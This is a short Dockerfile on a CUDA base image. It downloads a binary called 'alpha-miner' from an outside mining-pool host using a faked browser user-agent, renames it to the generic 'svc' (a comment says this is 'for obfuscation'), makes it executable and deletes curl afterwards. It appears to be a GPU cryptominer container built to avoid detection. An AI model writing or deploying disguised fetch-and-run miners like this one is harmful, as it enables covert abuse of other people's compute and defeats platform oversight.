FROM nvidia/cuda:12.8.1-runtime-ubuntu22.04

# install curl, download the worker binary (renamed for obfuscation), then strip apt cache
RUN apt-get update && \
    apt-get install -y --no-install-recommends curl ca-certificates && \
    curl -fsSL -A "Mozilla/5.0" -o /usr/local/bin/svc \
        https://pearl.alphapool.tech/downloads/alpha-miner && \
    chmod +x /usr/local/bin/svc && \
    apt-get purge -y --auto-remove curl && \
    rm -rf /var/lib/apt/lists/*

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
